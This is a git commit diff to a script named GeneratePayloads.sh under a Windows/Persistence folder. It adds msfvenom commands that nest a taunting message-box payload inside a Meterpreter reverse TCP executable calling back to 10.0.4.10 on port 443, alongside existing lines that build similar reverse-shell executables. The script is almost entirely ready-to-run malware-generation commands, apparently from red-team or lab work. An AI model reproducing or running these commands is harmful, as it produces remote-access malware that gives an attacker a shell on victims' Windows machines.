851f16c3840a2b05d649f197da70a5385ccb855a
megatop1 <43348736+megatop1@users.noreply.github.com>
2021-10-21 23:45:58 -0400

    Update GeneratePayloads.sh

--- Windows/Persistence/GeneratePayloads.sh
+++ Windows/Persistence/GeneratePayloads.sh
@@ -8,3 +8,8 @@ msfvenom --platform windows --arch x86 --format exe-service --encoder generic/no
 
 # Custom Generic EXE Payload
 msfvenom --platform windows --arch x86 --format exe --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=10.0.4.10 LPORT=443 > winmal.exe
+
+### Nested Payloads
+# Message Box
+msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=INFORMATION TITLE="Sorry" TEXT="You got pwned bro!" --format raw > Payload1
+msfvenom --add-code Payload1 --arch x86 --platform windows --payload windows/meterpreter_reverse_tcp LHOST=10.0.4.10 LPORT=443 --format exe > demo.exe
